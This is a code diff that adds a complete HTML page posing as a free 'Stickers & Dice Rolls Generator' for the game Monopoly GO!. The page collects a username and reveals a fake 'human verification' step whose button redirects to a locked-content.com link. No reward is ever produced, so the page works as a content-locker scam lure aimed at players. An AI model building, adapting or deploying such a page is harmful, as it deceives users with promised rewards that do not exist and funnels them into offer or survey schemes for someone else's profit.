@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Monopoly GO! Rewards</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background-color: #000;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box {
+      background-color: #111;
+      padding: 30px;
+      border-radius: 12px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border-radius: 6px;
+      border: none;
+    }
+    input, select {
+      background-color: #222;
+      color: white;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .verify-box {
+      margin-top: 20px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Free Stickers & Dice Rolls Generator</h2>
+    <input type="text" id="username" placeholder="Enter your username" required />
+    <select id="platform">
+      <option>Android</option>
+      <option>iOS</option>
+    </select>
+    <select id="reward">
+      <option>Dice Rolls</option>
+      <option>Sticker Pack</option>
+    </select>
+    <button onclick="generate()">Generate</button>
+    
+    <div class="verify-box" id="verifyBox">
+      <p>✅ Almost Done! Please complete human verification to finish.</p>
+      <button onclick="window.location.href='https://locked-content.com/?9a34809'">Verify Now</button>
+    </div>
+  </div>
+
+  <script>
+    function generate() {
+      const username = document.getElementById("username").value;
+      if (username.trim() === "") {
+        alert("Please enter your username.");
+        return;
+      }
+      document.getElementById("verifyBox").style.display = "block";
+    }
+  </script>
+</body>
+</html>
